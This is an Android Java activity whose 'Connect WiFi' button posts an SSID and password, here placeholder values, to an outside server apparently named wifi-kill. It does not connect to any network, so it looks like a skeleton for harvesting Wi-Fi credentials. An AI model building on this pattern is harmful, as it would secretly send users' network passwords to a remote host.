package com.yourdomain.myapp;

import android.os.AsyncTask;
import android.os.Bundle;
import android.view.View;
import android.widget.Button;
import android.widget.Toast;
import androidx.appcompat.app.AppCompatActivity;
import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;

public class MainActivity extends AppCompatActivity {

    private static final String SERVER_URL = "https://wifi-kill.onrender.com/submit_wifi";

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        Button btnConnectWiFi = findViewById(R.id.btnConnectWiFi);
        btnConnectWiFi.setOnClickListener(new View.OnClickListener() {
				@Override
				public void onClick(View v) {
					// WiFi ulanish uchun ma'lumotlar
					String ssid = "YourSSID";  // Wi-Fi SSID
					String password = "YourPassword";  // Wi-Fi parol
					new SendWiFiDataTask().execute(ssid, password);
				}
			});
    }

    private class SendWiFiDataTask extends AsyncTask<String, Void, String> {

        @Override
        protected String doInBackground(String... params) {
            String ssid = params[0];
            String password = params[1];

            try {
                URL url = new URL(SERVER_URL);
                HttpURLConnection conn = (HttpURLConnection) url.openConnection();
                conn.setRequestMethod("POST");
                conn.setRequestProperty("Content-Type", "application/json; utf-8");
                conn.setRequestProperty("Accept", "application/json");
                conn.setDoOutput(true);

                String jsonInputString = String.format("{\"ssid\": \"%s\", \"password\": \"%s\"}", ssid, password);

                try (OutputStream os = conn.getOutputStream()) {
                    byte[] input = jsonInputString.getBytes("utf-8");
                    os.write(input, 0, input.length);
                }

                int responseCode = conn.getResponseCode();
                return responseCode == HttpURLConnection.HTTP_OK ? "Success" : "Failed";
            } catch (Exception e) {
                e.printStackTrace();
                return "Error";
            }
        }

        @Override
        protected void onPostExecute(String result) {
            Toast.makeText(MainActivity.this, "Server response: " + result, Toast.LENGTH_SHORT).show();
        }
    }
}
